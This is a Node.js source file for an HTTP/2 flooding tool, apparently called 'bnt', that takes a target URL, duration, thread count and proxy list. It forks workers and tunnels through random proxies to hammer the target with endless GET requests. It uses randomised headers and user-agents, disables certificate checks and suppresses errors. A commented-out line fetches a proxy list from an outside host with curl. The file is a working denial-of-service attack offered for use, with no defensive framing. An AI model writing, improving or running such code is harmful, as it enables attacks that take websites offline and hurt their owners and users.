const fs = require('fs');
const crypto = require('crypto');
const UserAgent = require('user-agents');
const http = require('http');
const http2 = require('http2');
var request = require('request');
const tls = require('tls');
const url = require('url');
const cluster = require('cluster');
const { PassThrough } = require('stream');
const JSStreamSocket = (new tls.TLSSocket(new PassThrough()))._handle._parentWrap.constructor;
//const { exec } = require("child_process");
//exec('curl -O https://sheesh.rip/http.txt --user-agent "hello bnt"')

require('events').EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);
process.on('uncaughtException', function(error) {});
process.on('unhandledRejection', function(error) {})

if (process.argv.length < 6) {
  console.clear();
  console.log("- bnt loves you <3\n- node bnt.js <url> <time> <threads> <proxies> optional(<rand>)");
  process.exit(0);
}

const accept_header = [
    '*/*',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8',
    'application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*',
    'text/html, application/xhtml+xml, image/jxr, */*',
    'text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1',
    'application/javascript, */*;q=0.8',
    'text/html, text/plain; q=0.6, */*; q=0.1',
    'application/graphql, application/json; q=0.8, application/xml; q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
],
cache_header = [
    'no-cache',
    'max-age=0'
]


var target = process.argv[2];
var time = process.argv[3];
var threads = process.argv[4];
var proxy = process.argv[5];
var proxies = fs.readFileSync(proxy, 'utf-8').toString().replace(/\r/g, '').split('\x0A');
var parsed = url.parse(target);
const payload = {};
const userAgentv1 = new UserAgent();

if (cluster.isMaster) {
   console.clear();
	 console.log('- bnt loves you <3\n- started');
    for (let i = 0; i < threads; i++) {
        cluster.fork();
    }
} else {
	class buildTLS {
		http2tun(ip) {
      const userAgentv2 = new UserAgent();
      if (process.argv[6] == "rand") {
        var useragent = userAgentv2.toString();
      } else {
        var useragent = userAgentv1.toString();
      }
			payload[':authority'] = parsed.host;
			payload[':method'] = 'GET';
			payload[':path'] = parsed.path;
			payload[':scheme'] = 'https';
			payload['accept'] = accept_header[Math.floor(Math.random() * accept_header.length)];
			payload['accept-encoding'] = 'gzip, deflate, br';
			payload['accept-language'] = 'en-US;q=0.8,en;q=0.7';
			payload['cache-control'] = cache_header[Math.floor(Math.random() * cache_header.length)];
			payload['user-agent'] = useragent;
					
			const client = http2.connect(parsed.href, {
			  createConnection: () => {
				return tls.connect({
				  socket: new JSStreamSocket(ip),
				  servername: parsed.host,
          host: parsed.host,
          secure: true,                                  
				  rejectUnauthorized: false,                     
				  ALPNProtocols: ['h2', 'http/1.1', 'h3', 'http/2+quic/43', 'http/2+quic/44', 'http/2+quic/45'],
				}, () => {
						setInterval(async() => {
						  await client.request(payload).close()
						})
				})
			  }
			})
		}
	}
	
	extBuild = new buildTLS();
	
	function flood() {
		for(let rs=0; rs < Math.floor(Math.random() * 64); rs++) { //DONT CHANGE
			
			var proxy = proxies[Math.floor(Math.random() * proxies.length)];
			proxy = proxy.split(':');
			
			var transfer = http.get({
				host: proxy[0],
				port: proxy[1],
				method: "CONNECT",
				path: parsed.host + ":443"				
			})
			
			transfer.end();
			
			transfer.on('connect', (res, transfer) => {	
				extBuild.http2tun(transfer);
			});
			
			transfer.on('end', () => {
			  transfer.resume();
			  transfer.close();
			})			
		}
	}
	setInterval(flood);
	setTimeout(function() {
	  console.clear();
	  process.exit()
	}, time * 1000);
}